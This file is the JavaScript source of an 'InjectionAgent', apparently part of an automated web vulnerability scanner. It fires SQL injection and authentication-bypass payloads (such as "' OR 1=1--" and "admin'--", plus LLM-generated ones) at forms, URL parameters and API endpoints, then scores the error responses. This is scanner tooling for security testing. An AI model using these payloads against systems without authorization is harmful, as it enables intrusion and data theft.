const BaseAgent = require('./baseAgent');
const { timedRequest } = require('../utils/httpClient');
const ValidationEngine = require('../engine/validationEngine');
const { generatePayloads } = require('../llm/mistralClient');
const { appendParam } = require('../utils/urlHelper');

const INJECT_TIMEOUT = 8000;

// Filter out time-based payloads that cause unnecessary timeouts
function filterTimingPayloads(payloads) {
    const timingPatterns = /sleep|waitfor|delay|benchmark|pg_sleep|dbms_lock/i;
    return payloads.filter(p => !timingPatterns.test(p));
}

class InjectionAgent extends BaseAgent {
    constructor(logger, memory, findingsStore, registryRef = null) {
        super('InjectionAgent', 'A03 - Injection', logger, memory, findingsStore, registryRef);
        this.validator = new ValidationEngine(logger);
    }

    /* ── SQL-specific vs generic error detection ── */

    /** Patterns that are strong evidence of SQL injection (DB-specific error messages) */
    static SQL_SPECIFIC_PATTERNS = [
        /SQL syntax.*MySQL/i,
        /ORA-\d{5}/i,
        /PostgreSQL.*ERROR/i,
        /Microsoft.*ODBC.*SQL Server/i,
        /SQLITE_ERROR/i,
        /sqlite3\.OperationalError/i,
        /pg_query\(\)/i,
        /Unclosed quotation mark/i,
        /quoted string not properly terminated/i,
        /mysql_fetch/i,
        /You have an error in your SQL syntax/i,
        /supplied argument is not a valid MySQL/i,
        /unterminated quoted string at or near/i,
        /syntax error at or near/i,
    ];

    /** Patterns that only indicate a generic server error (NOT SQL-specific) */
    static GENERIC_ERROR_PATTERNS = [
        /at\s+\w+\s+\(.*:\d+:\d+\)/i,
        /Traceback\s+\(most recent call/i,
        /Exception in thread/i,
        /Fatal error:/i,
        /Stack trace:/i,
        /Uncaught\s+\w*Error/i,
        /Warning:.*\(\)/i,
        /on line \d+/i,
    ];

    /**
     * Classify evidence as sql-specific or generic, and compute a confidence
     * score that reflects how likely the finding is a true SQL injection.
     */
    _calculateConfidence({ sqlPatternCount = 0, genericPatternCount = 0, authBypassed = false, serverError500 = false, timingAnomaly = false, anomalyScore = 0, dbErrorIn500 = false }) {
        let score = 0.1; // base

        // Auth bypass (200 + token) is the strongest signal — near certain
        if (authBypassed) return 0.95;

        // DB-specific error in a 500 response (e.g. SQLITE_ERROR when sending
        // SQL payload) is strong proof the input reaches the DB unparameterized.
        // This is classic error-based SQL injection confirmation.
        if (dbErrorIn500) return 0.85;

        // DB-specific error patterns in the response body (non-500 or general)
        // still very strong — the engine name leaked means injected SQL reached it.
        if (sqlPatternCount > 0) {
            score += 0.55;                                 // first pattern = strong
            score += Math.min((sqlPatternCount - 1) * 0.1, 0.15); // extra patterns
            if (serverError500) score += 0.1;              // 500 + DB error = even stronger
        }

        // Generic server errors (stack traces, warnings) alone are NO LONGER
        // flagged as SQL injection.  They only contribute a small bonus when
        // SQL-specific patterns are already present.
        if (genericPatternCount > 0 && sqlPatternCount > 0) {
            score += 0.05;                                 // supplementary info only
        }

        // Response-diff anomaly is circumstantial
        if (anomalyScore > 0.5) score += 0.1;

        // Time-based anomaly adds a little
        if (timingAnomaly) score += 0.1;

        return Math.min(1.0, Math.max(0.05, score));
    }

    /**
     * Detects SQL-specific vs generic error patterns separately.
     * Returns { sqlPatterns, genericPatterns, allDetected }.
     */
    _classifyErrors(responseBody) {
        const body = typeof responseBody === 'string' ? responseBody : JSON.stringify(responseBody || '');
        const sqlMatches = InjectionAgent.SQL_SPECIFIC_PATTERNS.filter(p => p.test(body));
        const genericMatches = InjectionAgent.GENERIC_ERROR_PATTERNS.filter(p => p.test(body));
        return {
            sqlPatterns: sqlMatches,
            genericPatterns: genericMatches,
            allDetected: sqlMatches.length + genericMatches.length > 0,
        };
    }

    async execute(target) {
        const findings = [];
        const { forms, parameters } = this.memory.attackSurface;

        // Test form inputs (relaxed: 15 forms, 3 inputs each)
        for (const form of forms.slice(0, 15)) {
            const textInputs = form.inputs.filter(i =>
                ['text', 'search', 'email', 'password', 'hidden', 'number', ''].includes(i.type) && i.name
            );
            for (const input of textInputs.slice(0, 3)) {
                try {
                    const result = await this._testInjection(form.action, input.name, form.method);
                    findings.push(...result);
                } catch (err) {
                    this.logger.debug(`[InjectionAgent] Error testing ${form.action}/${input.name}: ${err.message}`);
                }
            }
        }

        // Test URL parameters (relaxed: 20 parameters)
        const seen = new Set();
        for (const param of parameters) {
            const key = `${param.url}-${param.param}`;
            if (seen.has(key)) continue;
            seen.add(key);
            if (seen.size > 20) break;
            try {
                const result = await this._testParameterInjection(param.url, param.param);
                findings.push(...result);
            } catch (err) {
                this.logger.debug(`[InjectionAgent] Error testing param ${param.param}: ${err.message}`);
            }
        }

        // Test API endpoints (fuzz common parameters in JSON bodies)
        const seenApis = new Set();
        // Generalized high-risk keywords for prioritization
        const highRiskKeywords = [
            'login', 'signin', 'auth', 'user', 'profile', 'account', 'search', 'query',
            'product', 'item', 'order', 'track', 'checkout', 'admin', 'config', 'settings',
            'api', 'rest', 'v1', 'v2', 'password', 'secure', 'private'
        ];

        const isInteresting = (api) => highRiskKeywords.some(kw => api.toLowerCase().includes(kw.toLowerCase()));

        const interestingApis = this.memory.attackSurface.apiEndpoints.filter(isInteresting);
        // Put interesting ones first
        const candidates = [...new Set([...interestingApis, ...this.memory.attackSurface.apiEndpoints])];

        for (const api of candidates) {
            if (seenApis.has(api)) continue;
            seenApis.add(api);
            if (seenApis.size > 30) break; // Increased limit for better coverage

            // Focus on endpoints that look interesting for injection
            if (isInteresting(api)) {
                try {
                    const result = await this._testApiInjection(api);
                    findings.push(...result);
                } catch (err) {
                    this.logger.debug(`[InjectionAgent] Error testing API ${api}: ${err.message}`);
                }
            }
        }

        return findings;
    }

    async _testInjection(url, inputName, method) {
        const findings = [];

        // Capture baseline
        const baselineData = method === 'POST' ? { [inputName]: 'testvalue123' } : undefined;
        const baselineParams = method === 'GET' ? { [inputName]: 'testvalue123' } : undefined;
        const baselineResponse = await timedRequest(url, {
            method, data: baselineData, params: baselineParams, timeout: INJECT_TIMEOUT,
        });
        const baseline = this.validator.captureBaseline(baselineResponse);

        // Generate payloads via LLM (error-based and UNION-based only)
        let payloads;
        try {
            payloads = await generatePayloads({
                vulnType: 'SQL Injection (error-based and UNION-based ONLY. Do NOT include time-based like SLEEP or WAITFOR or BENCHMARK)',
                targetContext: `Form input field: ${inputName}`,
                inputField: inputName,
                count: 4,
            });
            payloads = filterTimingPayloads(payloads);
        } catch {
            payloads = [
                "' OR 1=1--",
                "' OR '1'='1'--",
                "' UNION SELECT NULL,NULL--",
                "1' AND '1'='1'--",
            ];
        }

        for (const payload of payloads.slice(0, 4)) {
            try {
                const testData = method === 'POST' ? { [inputName]: payload } : undefined;
                const testParams = method === 'GET' ? { [inputName]: payload } : undefined;
                const testResponse = await timedRequest(url, {
                    method, data: testData, params: testParams, timeout: INJECT_TIMEOUT,
                });

                const comparison = this.validator.compareResponses(baseline, testResponse);
                const errorInfo = this._classifyErrors(testResponse.data);
                const timing = this.validator.detectTimingAnomaly(baseline.timingMs, testResponse.timingMs);

                // Detect DB-specific error in 500 — strong confirmation
                const responseStr = JSON.stringify(testResponse.data).toLowerCase();
                const dbErrorIn500 = (comparison.statusChanged && testResponse.status >= 500) && (
                    errorInfo.sqlPatterns.length > 0 ||
                    /sqlite|mysql|postgres|oracle|mssql|sql server/i.test(responseStr)
                );

                let suspicious = false;
                let evidence = [];

                if (errorInfo.sqlPatterns.length > 0) {
                    suspicious = true;
                    evidence.push(`SQL error patterns detected: ${errorInfo.sqlPatterns.map(p => p.source).join(', ')}`);
                }

                // Generic stack traces / error messages alone are NOT evidence
                // of SQL injection — they can be triggered by any malformed input.
                // Only log them as supplementary info when SQL patterns are also present.
                if (errorInfo.genericPatterns.length > 0 && errorInfo.sqlPatterns.length > 0) {
                    evidence.push(`Also found generic error patterns: ${errorInfo.genericPatterns.map(p => p.source).join(', ')}`);
                }

                if (timing.anomalous) {
                    suspicious = true;
                    evidence.push(`Time-based anomaly: ${timing.deltaMs}ms delay (ratio: ${timing.ratio.toFixed(2)}x)`);
                }

                if (comparison.statusChanged && testResponse.status >= 500) {
                    suspicious = true;
                    evidence.push(`Server error triggered: status ${testResponse.status}`);
                }

                if (comparison.anomalyScore > 0.5 && evidence.length > 0) {
                    evidence.push(`High anomaly score: ${comparison.anomalyScore}`);
                }

                if (suspicious) {
                    const confidence = this._calculateConfidence({
                        sqlPatternCount: errorInfo.sqlPatterns.length,
                        genericPatternCount: errorInfo.genericPatterns.length,
                        serverError500: comparison.statusChanged && testResponse.status >= 500,
                        dbErrorIn500,
                        timingAnomaly: timing.anomalous,
                        anomalyScore: comparison.anomalyScore,
                    });
                    this.addFinding({
                        type: 'SQL Injection',
                        endpoint: url,
                        parameter: inputName,
                        description: `Possible SQL injection vulnerability detected in ${inputName}`,
                        evidence: evidence.join('; '),
                        payload,
                        confidenceScore: confidence,
                        exploitScenario: `An attacker can inject SQL commands through the "${inputName}" parameter to manipulate database queries`,
                        impact: 'Data theft, unauthorized access, data modification, or complete database compromise',
                        reproductionSteps: [
                            `1. Navigate to: ${url}`,
                            `2. Locate the input field named "${inputName}"`,
                            `3. Enter the following payload: ${payload}`,
                            `4. Submit the form using ${method} method`,
                            `5. Observe: ${evidence.join('; ')}`,
                        ],
                    });
                    findings.push({ type: 'SQL Injection', endpoint: url, parameter: inputName });
                    break;
                }
            } catch (err) {
                this.logger.debug(`[InjectionAgent] Payload test error: ${err.message}`);
            }
        }

        return findings;
    }

    async _testParameterInjection(url, paramName) {
        const findings = [];
        const { URL } = require('url');

        // Capture baseline
        const baselineResponse = await timedRequest(url, { timeout: INJECT_TIMEOUT });
        const baseline = this.validator.captureBaseline(baselineResponse);

        const payloads = ["' OR 1=1--", "1 OR 1=1--", "'; SELECT 1--", "' UNION SELECT NULL--"];

        for (const payload of payloads) {
            try {
                const testUrl = appendParam(url, paramName, payload);
                const testResponse = await timedRequest(testUrl, { timeout: INJECT_TIMEOUT });

                const comparison = this.validator.compareResponses(baseline, testResponse);
                const errorInfo = this._classifyErrors(testResponse.data);

                // Detect DB-specific error in 500
                const responseStr = JSON.stringify(testResponse.data).toLowerCase();
                const dbErrorIn500 = (comparison.statusChanged && testResponse.status >= 500) && (
                    errorInfo.sqlPatterns.length > 0 ||
                    /sqlite|mysql|postgres|oracle|mssql|sql server/i.test(responseStr)
                );

                // Only flag if there is SQL-SPECIFIC evidence — generic stack traces
                // alone (e.g. "at Function.call (/path:10:5)") are NOT SQL injection.
                const hasSqlEvidence = errorInfo.sqlPatterns.length > 0 || dbErrorIn500;
                if (hasSqlEvidence) {
                    const confidence = this._calculateConfidence({
                        sqlPatternCount: errorInfo.sqlPatterns.length,
                        genericPatternCount: errorInfo.genericPatterns.length,
                        serverError500: comparison.statusChanged && testResponse.status >= 500,
                        dbErrorIn500,
                        anomalyScore: comparison.anomalyScore,
                    });
                    const evidenceParts = [];
                    if (errorInfo.sqlPatterns.length > 0) evidenceParts.push(`SQL error patterns: ${errorInfo.sqlPatterns.map(p => p.source).join(', ')}`);
                    if (dbErrorIn500) evidenceParts.push(`DB error in ${testResponse.status} response`);
                    if (comparison.anomalyScore > 0.5) evidenceParts.push(`Anomaly score: ${comparison.anomalyScore}`);
                    const evidenceStr = evidenceParts.join('; ');
                    this.addFinding({
                        type: 'SQL Injection',
                        endpoint: url,
                        parameter: paramName,
                        description: `Possible SQL injection via URL parameter "${paramName}"`,
                        evidence: evidenceStr,
                        payload,
                        confidenceScore: confidence,
                        exploitScenario: `Attacker can manipulate the ${paramName} URL parameter to inject SQL`,
                        impact: 'Database compromise, data exfiltration',
                        reproductionSteps: [
                            `1. Open URL: ${testUrl}`,
                            `2. The parameter "${paramName}" contains the payload: ${payload}`,
                            `3. Observe: ${evidenceStr}`,
                        ],
                    });
                    findings.push({ type: 'SQL Injection', endpoint: url, parameter: paramName });
                    break;
                }
            } catch (_) { }
        }

        return findings;
    }
    async _testApiInjection(url) {
        const findings = [];
        // Payloads with -- comment terminators first (needed to close the rest of
        // the original query and attempt actual exploitation / auth bypass).
        // Without --, the remaining SQL causes a syntax error which is still
        // useful for error-based detection but won't bypass auth.
        const payloads = [
            { email: "' OR 1=1--", password: "a" },
            { email: "admin'--", password: "a" },
            { email: "' OR 1=1-- -", password: "a" },     // space-dash variant (MySQL)
            { email: "' OR '1'='1'--", password: "a" },   // balanced quotes + comment
            { username: "' OR 1=1--", password: "a" },
            { id: "1 OR 1=1--" },
            { q: "apple' OR 1=1--" },
        ];

        try {
            // Capture baseline
            const baselineResponse = await timedRequest(url, { method: 'POST', data: { email: 'test', password: 'test' }, timeout: INJECT_TIMEOUT });
            const baseline = this.validator.captureBaseline(baselineResponse);

            for (const payload of payloads) {
                try {
                    const testResponse = await timedRequest(url, { method: 'POST', data: payload, timeout: INJECT_TIMEOUT });
                    const errorInfo = this._classifyErrors(testResponse.data);

                    let suspicious = false;
                    let evidenceStr = '';
                    let authBypassed = false;

                    // Check for DB-specific error in the raw response body (covers both
                    // the errorInfo patterns AND substring checks like 'sqlite').
                    const responseStr = JSON.stringify(testResponse.data).toLowerCase();
                    const hasDbErrorIn500 = testResponse.status >= 500 && (
                        errorInfo.sqlPatterns.length > 0 ||
                        /sqlite|mysql|postgres|oracle|mssql|sql server/i.test(responseStr)
                    );

                    if (testResponse.status === 200 && testResponse.data && testResponse.data.authentication) {
                        suspicious = true;
                        authBypassed = true;
                        evidenceStr = "Authentication bypassed via SQL injection (200 OK with token)";
                    } else if (hasDbErrorIn500) {
                        suspicious = true;
                        const dbName = (responseStr.match(/sqlite|mysql|postgres|oracle|mssql|sql server/i) || ['SQL'])[0];
                        evidenceStr = `${dbName.toUpperCase()} database error in ${testResponse.status} response — injected SQL reached the DB engine unparameterized`;
                    } else if (errorInfo.sqlPatterns.length > 0) {
                        suspicious = true;
                        evidenceStr = `SQL Error patterns: ${errorInfo.sqlPatterns.map(p => p.source).join(', ')}`;
                    }
                    // Generic stack traces / error messages (e.g. "at Function (file:10:5)")
                    // are NOT flagged as SQL injection — they can be triggered by any bad input.

                    if (suspicious) {
                        const confidence = this._calculateConfidence({
                            sqlPatternCount: errorInfo.sqlPatterns.length,
                            genericPatternCount: errorInfo.genericPatterns.length,
                            authBypassed,
                            serverError500: testResponse.status >= 500,
                            dbErrorIn500: hasDbErrorIn500,
                        });
                        const payloadStr = JSON.stringify(payload);
                        this.addFinding({
                            type: 'SQL Injection',
                            endpoint: url,
                            parameter: "JSON Body",
                            description: `SQL injection vulnerability detected in API endpoint`,
                            evidence: evidenceStr,
                            payload: payloadStr,
                            confidenceScore: confidence,
                            exploitScenario: `Attacker can send crafted JSON to bypass authentication or maliciously interact with the database`,
                            impact: 'Authentication bypass, Database compromise, Data exfiltration',
                            reproductionSteps: [
                                `1. Send POST request to: ${url}`,
                                `2. Set Content-Type header to application/json`,
                                `3. Send the following JSON payload: ${payloadStr}`,
                                `4. Observe: ${evidenceStr}`,
                            ],
                        });
                        findings.push({ type: 'SQL Injection', endpoint: url, parameter: "JSON Body" });
                        break;
                    }
                } catch (_) { }
            }
        } catch (_) { }
        return findings;
    }
}

module.exports = InjectionAgent;
